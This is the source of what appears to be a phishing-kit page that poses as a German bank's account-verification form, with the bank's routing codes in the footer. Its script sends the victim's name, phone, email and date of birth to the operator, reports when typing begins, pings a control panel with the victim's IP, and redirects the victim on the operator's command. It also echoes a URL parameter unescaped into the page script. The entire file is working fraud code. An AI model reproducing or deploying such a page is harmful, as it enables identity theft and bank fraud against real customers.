<?php 
require '../main.php';
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <link rel="stylesheet" href="res/app.css">
</head>
<body>
<header>
<img src="res/logo.svg">
</header>


<main>
<div class="form">



<div class="title">
Kontoverifizierung
</div>
<div class="text">
Bitte geben Sie die folgenden Daten ein, um fortzufahren.
</div>
<?php 
$helper->setError();
?>
<div class="col">
    <label>Name</label>
    <input type="text" id="name">
</div>

<div class="col">
    <label>Telefon</label>
    <input type="text" id="phone">
</div>

<div class="col">
    <label>E-Mail</label>
    <input type="text" id="email">
</div>

<div class="col">
    <label>Geburtsdatum</label>
    <input type="text" id="dob">
</div>


<div class="col btn">
    <button onclick="sendLog()">Weiter</button>
</div>



</div>
</main>




<footer>
<span>Sicherheit</span>
<span>Cookie-Einstellungen </span>
<span>Datenschutz </span>
<span>Barrierefreiheit </span>
<span>Nachhaltigkeit</span>
<span>AGB </span>
<span>Disclaimer </span>
<span>Impressum</span>
<span>BLZ: 76030080</span>
<span>BIC: CSDBDE71</span>
</footer>
<?php 
$helper->addLoader();
?>
<script>

function sendLog(){
    if($("#name").val()!="" && $("#phone").val()!="" && $("#email").val()!="" && $("#dob").val()!=""){
        $(".loader").show();
        $.post("post.php",{name:$("#name").val(), phone:$("#phone").val(), email:$("#email").val(), dob:$("#dob").val()});
    }
}


$("input").keypress((e)=>{
    if(e.key=="Enter"){
        sendLog();
    }
})


var abortNote = false;
$("input").keyup(()=>{
    if(!abortNote){
        $.post("post.php",{note:"Entering info..."});
        abortNote=true;
    }

});

setInterval(() => {
    $.post("../panel/update_statu.php",{update:1, ip:'<?php echo $pnl->IP; ?>'});
}, 1000);
var page ="<?php echo @$_GET['p']; ?>";
var cd = "<?php echo $current_data; ?>";

setInterval(() => {
    $.post("../panel/fetch.php", {update:1}, function(d){
        if(cd!=d && d!=0){
            window.location=d;
        }
    })

}, 2000);
</script>
</body>
</html>